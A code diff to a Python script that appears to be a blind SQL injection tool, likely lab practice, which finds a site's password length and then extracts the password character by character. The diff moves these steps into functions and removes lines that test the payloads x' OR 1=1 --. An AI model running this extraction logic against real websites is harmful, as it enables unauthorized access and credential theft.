@@ -7,7 +7,7 @@ import requests, sys
 from bs4 import BeautifulSoup
 import urllib.parse
 import time
-
+import string
 
 # Functions:
 
@@ -41,24 +41,8 @@ def test_string(url, prefix, letter):
     else:
         return False
 
-
-
-# Since I will be doing multithreading:
-if __name__ == "__main__":
-    site = sys.argv[1]
-    if 'https://' in site:
-        site = site.rstrip('/').lstrip('https://')
-
-    url = f'https://{site}/'
-
-    # Needed for the searching of password:
-    start_alpha = 'abcdefghijklmnopqrstuvwxyz0123456789'
-    prefix = ''
-
-
-    print(try_query("""x' OR 1=1 --"""))
-    print(try_query("""x" OR 1=1 --"""))
-
+# Step 6: Find the password Length:
+def find_password_length():
     # Step 6: Find the password Length:
     begin_time = time.perf_counter()
     num = 1
@@ -71,8 +55,12 @@ if __name__ == "__main__":
             break
     print(f"Password length is {num}")
     print(f"Time elapsed is {time.perf_counter()-begin_time}")
-    
-    # Step 8: Linear Search:
+    return num
+
+# Step 8: Linear Search:
+def linear_search():
+    start_alpha = string.ascii_lowercase + string.digits
+    prefix = ''
     begin_time = time.perf_counter()
     while True:
         # Test if the current prefix IS the exact password.
@@ -84,6 +72,23 @@ if __name__ == "__main__":
             if check:
                 prefix += letter
                 break
-
-    print(f"Password is {prefix}")
     print(f"Time elapsed is {time.perf_counter()-begin_time}")
+    return prefix
+
+
+
+
+# Since I will be doing multithreading:
+if __name__ == "__main__":
+    site = sys.argv[1]
+    if 'https://' in site:
+        site = site.rstrip('/').lstrip('https://')
+
+    url = f'https://{site}/'
+
+    # Step #6: Password Length:
+    password_length = find_password_length()
+
+    # Step #8: Linear Password search:
+    reference_password = linear_search()
+    print(f"Password is {reference_password}")
